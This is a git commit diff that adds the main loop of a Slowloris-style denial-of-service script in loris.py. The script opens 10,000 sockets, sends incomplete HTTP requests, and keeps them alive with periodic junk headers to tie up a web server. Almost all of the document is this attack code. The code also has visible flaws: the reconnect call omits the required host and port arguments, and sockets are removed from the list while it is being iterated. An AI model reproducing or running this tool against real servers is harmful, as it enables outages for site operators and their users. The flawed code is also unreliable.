483f523c2664dc7e8e1cc4d287d79bd541cbd889
Richard Antal Nagy <nagy.richard.antal@gmail.com>
2022-05-21 12:57:03 +0200

    Added main loris loop

--- loris.py
+++ loris.py
@@ -6,7 +6,7 @@ from agents import random_agent
 
 host = "127.0.0.1"
 port = 80
-s = None
+timing = 10
 
 def send_line(s, data):
     s.send(bytes(f"{data}\n", 'utf8'))
@@ -14,7 +14,7 @@ def send_line(s, data):
 def send_header(s, header, value):
     send_line(s, f"{header}: {value}")
 
-def create_socket():
+def create_socket(host, port):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.settimeout(10)
     s.connect((host, port))
@@ -22,3 +22,30 @@ def create_socket():
     send_line(s, f"GET /?{random.randint(0, 2000)} HTTP/1.1\n")
     send_header(s, "User-Agent", random_agent())
     return s
+
+def loris(n, host, port, timing):
+    # Open sockets
+    print("Opening initial sockets:", n)
+    sockets = [None] * n
+    for i in range(n):
+        sockets[i] = create_socket(host, port)
+
+    print("Initial sockets opened.")
+    
+    # Loop keepalive
+    while True:
+        for s in sockets:
+            try:
+                send_header(s, "X-Key", random.randint(0, 65554))
+            except:
+                sockets.remove(s)
+
+        print(f"Alive: {len(sockets)}/{n}")
+
+        for _ in range(n - len(sockets)):
+            sockets.append( create_socket() )
+
+        time.sleep(timing)
+        
+if __name__ == '__main__':
+    loris(10000, host, port, timing)
